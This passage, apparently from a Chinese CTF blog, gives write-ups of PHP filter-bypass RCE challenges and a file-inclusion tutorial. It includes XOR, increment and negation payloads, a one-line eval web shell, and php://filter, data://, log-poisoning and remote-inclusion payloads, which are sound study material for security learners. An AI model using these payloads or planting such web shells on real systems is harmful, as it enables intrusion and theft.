class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())))))))))));</span><br><span class="line"></span><br><span class="line">?code=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">phpversion</span>())))))))))))))));</span><br><span class="line"></span><br><span class="line">可以将show_source换成print_r,建议使用第一个</span><br></pre></td></tr></table></figure><h4 id="无字母数字的绕过"><a href="#无字母数字的绕过" class="headerlink" title="无字母数字的绕过"></a>无字母数字的绕过</h4><h5 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h5><p><strong>[HUBUCTF 2022 新生赛]HowToGetShell</strong></p><p>涉及知识点：无字母RCE-异或绕过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$mess=$_POST[<span class="string">&#x27;mess&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-zA-Z]/&quot;</span>,$mess))&#123;</span><br><span class="line">    die(<span class="string">&quot;invalid input!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">eval</span>($mess);</span><br><span class="line"><span class="comment">#过滤了所有大小写字母</span></span><br><span class="line"><span class="comment">#这里采用异或绕过</span></span><br><span class="line">valid = <span class="string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span></span><br><span class="line"></span><br><span class="line">answer = <span class="string">&quot;phpinfo&quot;</span></span><br><span class="line"></span><br><span class="line">tmp1, tmp2 = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> valid:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> valid:</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(c)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(tmp1)  <span class="comment"># 0302181</span></span><br><span class="line"><span class="built_in">print</span>(tmp2)  <span class="comment"># @[@[_^^</span></span><br><span class="line"><span class="comment">#payload: mess=$_=&quot;0302181&quot;^&quot;@[@[_^^&quot;;$_();</span></span><br></pre></td></tr></table></figure><h5 id="自增绕过"><a href="#自增绕过" class="headerlink" title="自增绕过"></a>自增绕过</h5><p>简介：</p><p>自增（Increment）通常指的是将某个值增加一个固定的增量。在编程中，自增通常用于循环计数、迭代或者更新变量的值等情况。</p><p><strong>[SWPUCTF 2021 新生赛]hardrce_3</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]; </span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\|&#x27;</span>]; </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;小伙子只会异或和取反？不好意思哦LTLT说不能用！！&quot;</span>); </span><br><span class="line">    &#125;&#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9]/is&#x27;</span>,<span class="variable">$wllm</span>)) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;sAlGhul说用字母数字是没有灵魂的！&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>; </span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过构造assert($<em>POST[</em>]);然后通过poat传参_&#x3D;phpinfo()[系统所要执行的命令即可</p><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">%24_%3d%5b%5d%3b%24_%3d%<span class="number">40</span>%<span class="number">22</span>%24_%<span class="number">22</span>%3b%24_%3d%24_%5b%<span class="number">27</span>!%<span class="number">27</span>%3d%3d%<span class="number">27</span>%<span class="number">40</span>%<span class="number">27</span>%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d%27_%<span class="number">27</span>%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24_%3d%<span class="number">24</span>%24____%3b%24___(%24_%5b_%5d)%3b</span><br></pre></td></tr></table></figure><p>搜索disable_functions，我们可以找到被禁用的函数</p><p><img src="/img/1722310534826-23.png" alt="img"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,<span class="built_in">exec</span>,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dlpc</span><br></pre></td></tr></table></figure><p>Payload:</p><p>_&#x3D;file_put_contents(‘1.php’,’<?php eval($_POST['aa']);?>‘);</p><p>通过写入一句话木马，蚁剑连接，得flag。</p><h5 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h5><p><strong>对所要执行的命令进行取反即可</strong></p><p><strong>[SWPUCTF 2021 新生赛]hardrce</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;wllm&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line">    $wllm = $_GET[<span class="string">&#x27;wllm&#x27;</span>]; </span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,]; </span><br><span class="line">    foreach ($blacklist <span class="keyword">as</span> $blackitem) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $wllm)) &#123; </span><br><span class="line">        die(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>); </span><br><span class="line">    &#125;&#125; </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,$wllm)) </span><br><span class="line">&#123; </span><br><span class="line">    die(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line">echo <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>; </span><br><span class="line"><span class="built_in">eval</span>($wllm); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    echo <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/17747410.html">无字母rce</a>：字母被过滤了，且设置了一个黑名单过滤了许多东西</p><p>涉及知识点：取反绕过</p><p>url编码取反绕过 ：就是我们将php代码url编码后取反，我们传入参数后服务端进行url解码，这时由于取反后，会url解码成不可打印字符，这样我们就会绕过</p><p>payload:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line">echo <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">echo urlencode(~<span class="string">&#x27;ls /&#x27;</span>);<span class="comment">#ls / -&gt; cat /flag</span></span><br><span class="line">?&gt;</span><br><span class="line"><span class="comment">#%8C%86%8C%8B%9A%92</span></span><br><span class="line"><span class="comment">#%93%8C%DF%D0</span></span><br><span class="line"><span class="comment">#payload:~(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);记住结尾要加分号</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2024/07/23/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2024/07/23/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>misc学习先放一段时间，感觉没进步了，总结一下misc知识点然后开始进击web，之前做了一些web题目，一直没有系统的整理和学习，趁着暑假有时间，那就直接开始吧！</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>文件包含漏洞</code>是指客户端（一般为浏览器）用户通过输入控制动态包含在服务器的文件，从而导致恶意代码的执行及敏感信息的泄露，主要包括<code>本地文件包含LFI</code>和<code>远程文件包含RFI</code>两种形式</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>常见的文件包含漏洞的形式</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a><strong>目录</strong></h2><ul><li>PHP伪协议利用</li><li>日志文件包含</li><li>包含临时文件</li><li>远程文件包含</li></ul><p><strong>漏洞危害</strong></p><ol><li>读取敏感文件</li><li>获取webshell</li><li>任意命令执行</li><li>在某些情况下，根据LFI漏洞的性质，可以运行系统可执行文件</li></ol><p><strong>存在漏洞的函数</strong>：</p><ul><li><strong>include()</strong> 只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</li><li><strong>require()</strong> 只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</li><li><strong>include_once()</strong> 功能include()一样，区别在于当重复调用同一文件时，程序只调用一次。</li><li><strong>require_once()</strong> 功能require()一样，区别在于当重复调用同一文件时，程序只调用一次。</li></ul><p>文件包含功能要实现，<code>需要在PHP的配置文件php.ini中开启allow_url_include；如果是远程文件包含，则除此之外还需要开启allow_url_fopen。</code></p><p>考虑常见的几种包含方式</p><ul><li>同目录包含 <code>file=.htaccess</code></li><li>目录遍历 <code>?file=../../../../../../../../../var/lib/locate.db</code></li><li>日志注入 <code>?file=../../../../../../../../../var/log/apache/error.log</code></li><li>利用 <code>/proc/self/environ</code></li></ul><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>简介：</p><p>文件包含漏洞的产生原因是 PHP 语言在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p><p>当被包含的文件在服务器本地时，就形成的本地文件包含漏洞</p><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>简介：</p><p>目录穿越（也被称为目录遍历&#x2F;directory traversal&#x2F;path traversal）是通过使用 <code>../</code> 等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等</p><h3 id="PHP封装协议-伪协议"><a href="#PHP封装协议-伪协议" class="headerlink" title="PHP封装协议(伪协议)"></a>PHP封装协议(伪协议)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">File://  访问本地文件系统</span><br><span class="line">http://  访问HTTPs网址</span><br><span class="line">ftp://  访问ftp URL</span><br><span class="line">Php://  访问输入输出流</span><br><span class="line">Zlib://  压缩流</span><br><span class="line">Data://  数据</span><br><span class="line">Ssh2://  security shell2</span><br><span class="line">Expect://  处理交互式的流</span><br><span class="line">Glob://  查找匹配的文件路径</span><br></pre></td></tr></table></figure><p>php.ini配置文件：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">allow_url_fopen=off 即不可以包含远程文件。php4存在远程包含&amp;本地包含，php5仅存在本地包含</span><br></pre></td></tr></table></figure><p>测试版本&gt;&#x3D;5.2</p><h4 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h4><p>作用：</p><p>用于访问本地文件系统，在CTF中通常用来读取本地文件,且不受allow_url_fopen与allow_url_include的影响。</p><p><code>include()/require()/include_once()/require_once()</code>参数可控的情况下</p><p>如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的</p><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#1. file://[文件的绝对路径和文件名]</span><br><span class="line">http://127.0.0.1/include.php?file=file://C:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br><span class="line"></span><br><span class="line">#2. file://[文件的相对路径和文件名]</span><br><span class="line">http://127.0.0.1/include.php?file=./phpinfo.txt</span><br><span class="line"></span><br><span class="line">#3. file://[网络路径和文件名]</span><br><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="**php:&#x2F;&#x2F;**filter"></a>**php:&#x2F;&#x2F;**<strong>filter</strong></h4><blockquote><p>利用<code>php://filter</code>查看源代码：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter`是一种元封装器，设计用于数据流打开时的筛选过滤应用；在文件包含中用于读取文件内容，读取后输出`base64编码`后的内容，要获取真实内容的话，`需要进行base64解码</span><br></pre></td></tr></table></figure><p>代码实例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br><span class="line">?file=php://filter/convert.base64-encode/resource=../sss.php</span><br></pre></td></tr></table></figure><h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a><strong>php:&#x2F;&#x2F;input</strong></h4><p>利用php伪协议：php:&#x2F;&#x2F;input</p><p>利用条件：</p><ol><li>PHP.ini 中 allow_url_include&#x3D; On php &lt;5.0 ，allow_url_include&#x3D;Off 也可以</li></ol><p><code>php://input</code>是个可以访问请求的原始数据的只读流。使用时，将要输入的数据以post方式提交</p><h4 id="data伪协议"><a href="#data伪协议" class="headerlink" title="data伪协议"></a><strong>data伪协议</strong></h4><p>利用php伪协议：<code>data</code></p><p>利用条件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php &gt; 5.2</span><br><span class="line">allow_url_fopen=On &amp;&amp; allow_url_include=On</span><br></pre></td></tr></table></figure><p>利用代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">?file=data:text/plain,&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br><span class="line">?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><h4 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a><strong>phar:&#x2F;&#x2F;</strong></h4><p>phar:&#x2F;&#x2F; 数据流包装器自PHP 5.3.0起开始。这个参数是就是<code>php解压缩包</code>的一个函数，不管目标文件后缀是什么，都将其当做压缩包来解压</p><p>利用条件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP&gt;= 5.3.0</span><br></pre></td></tr></table></figure><p>用法格式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=phar://压缩包/内部文件</span><br></pre></td></tr></table></figure><blockquote><p>注意：绝对路径或相对路径均可；压缩包只能使用<code>zip协议</code>压缩</p></blockquote><h4 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;"></a><strong>zip:&#x2F;&#x2F;</strong></h4><p>zip伪协议和phar协议类似,但是用法不一样。</p><p>利用条件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5.2.17 =&lt;php &lt;= 7.0.12</span><br></pre></td></tr></table></figure><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]zip://xxx.png#shell.php或zip://xxx.zip#shell.php</span><br></pre></td></tr></table></figure><h2 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a><strong>session文件包含</strong></h2><p>利用条件：</p><ol><li>session的存储位置可以获取 session中的内容可以被控制，传入恶意代码</li></ol><p>利用思路：</p><ol><li>通过参数name写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell</li><li>通过phpinfo的信息可以获取到session的存储位置</li></ol><p>此时我们利用这个页面，将用户的get数据存储到session中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$$name=$$_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">$$_SESSION[<span class="string">&quot;name&quot;</span>]=$$name;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可见此时已经将 <strong>phpinfo</strong> 写入到 session文件中，此时我们利用文件包含漏洞去包含这个文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=../../../../var/lib/php/sessions/sess_sdmofnu8knlh9jlqe89l8smduu</span><br></pre></td></tr></table></figure><h2 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h2><p>常见的日志文件存储路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apache+Linux`日志默认路径：`/etc/httpd/logs/access.log`、`/var/log/httpd/access.log`、`var/log/apache2/access.log`、`var/log/apache2/error.log</span><br><span class="line">apache+win2003`日志默认路径：`D:\xampp\apache\logs\access.log`、`D:\xampp\apache\logs\error.log</span><br><span class="line">IIS6.0+win2003`默认日志文件：`C:\WINDOWS\system32\Logfiles` `IIS7.0+win2003` 默认日志文件：`%SystemDrive%\inetpub\logs\LogFiles</span><br></pre></td></tr></table></figure><p><code>nginx</code> 日志文件：日志文件在用户安装目录logs目录下,假设安装路径为<code>/usr/local/nginx</code>或者<code>var/log/nginx/</code>,那日志目录就是在<code>/usr/local/nginx/logs</code>或者<code>var/log/nginx/access.log</code>下面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apache+linux` 默认配置文件：`/etc/httpd/conf/httpd.conf`或`/etc/init.d/httpd` `IIS6.0+win2003`` `配置文件：`C:/Windows/system32/inetsrv/metabase.xml</span><br><span class="line">IIS7.0+WIN `配置文件：`C:\Windows\System32\inetsrv\config\applicationHost.config</span><br></pre></td></tr></table></figure><h3 id="apache-nginx-报错日志"><a href="#apache-nginx-报错日志" class="headerlink" title="apache&#x2F;nginx 报错日志"></a><strong>apache</strong><strong>&#x2F;nginx 报错日志</strong></h3><p><strong>访问日志</strong></p><p>可利用条件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要知道服务器日志的存储路径，且日志文件可读</span><br></pre></td></tr></table></figure><p>利用原理</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log</span><br></pre></td></tr></table></figure><p>利用文件包含漏洞去包含log文件</p><p><img src="/img/1721784913663-13.png" alt="img"></p><h3 id="SSH-登录日志"><a href="#SSH-登录日志" class="headerlink" title="SSH 登录日志"></a><strong>SSH</strong> <strong>登录日志</strong></h3><p>利用条件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要知道ssh-log的位置，且可读</span><br></pre></td></tr></table></figure><p>ssh日志默认路径：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/log/auth.log（默认情况下，所有用户都可读）</span><br><span class="line">/var/log/secure</span><br></pre></td></tr></table></figure><p>使用ssh客户端：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh &#x27;&lt;?php phpinfo();?&gt;&#x27;@IP</span><br></pre></td></tr></table></figure><p><img src="/img/1721784913661-1.png" alt="img"></p><h2 id="临时文件包含"><a href="#临时文件包含" class="headerlink" title="临时文件包含"></a><strong>临时文件包含</strong></h2><p>php 中上传文件，会创建临时文件。在 linux 下使用 &#x2F;tmp 目录，而在 windows 下使用 <code>c:\winsdows\temp</code> 目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p><p><strong>漏洞原理</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是/tmp/php[6个随机字符]），文件名可以在$_FILES变量中找到。这个临时文件，在请求结束后就会被删除。</span><br><span class="line">同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到$_FILES变量的内容，自然也包含临时文件名。</span><br></pre></td></tr></table></figure><p><strong>利用原理</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell，这里需要利用到条件竞争</span><br></pre></td></tr></table></figure><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a><strong>远程文件包含</strong></h2><p>在PHP 5.2后，<code>php.ini</code>默认配置下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_fopen=on</span><br><span class="line">allow_url_include=off</span><br></pre></td></tr></table></figure><blockquote><p>此时除非网站管理员开启配置 否则无法远程文件包含。在某些CTF题中可能遇到。只做了解即可</p></blockquote><h3 id="远程文件绕过技巧"><a href="#远程文件绕过技巧" class="headerlink" title="远程文件绕过技巧"></a>远程文件绕过技巧</h3><ol><li>问号绕过</li></ol><p>包含目标<code>PHP</code>页面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=http://192.168.91.139/phpinfo.php?</span><br></pre></td></tr></table></figure><ol><li>#号绕过：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=http://192.168.91.139/phpinfo.php#</span><br></pre></td></tr></table></figure><h2 id="其他绕过方式"><a href="#其他绕过方式" class="headerlink" title="其他绕过方式"></a>其他绕过方式</h2><h3 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h3><p>如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过</p><h3 id="特殊字符绕过"><a href="#特殊字符绕过" class="headerlink" title="特殊字符绕过"></a>特殊字符绕过</h3><ul><li>某些情况下，读文件支持使用Shell通配符，如 <code>?</code> <code>*</code> 等</li><li>url中 使用 <code>?</code> <code>#</code> 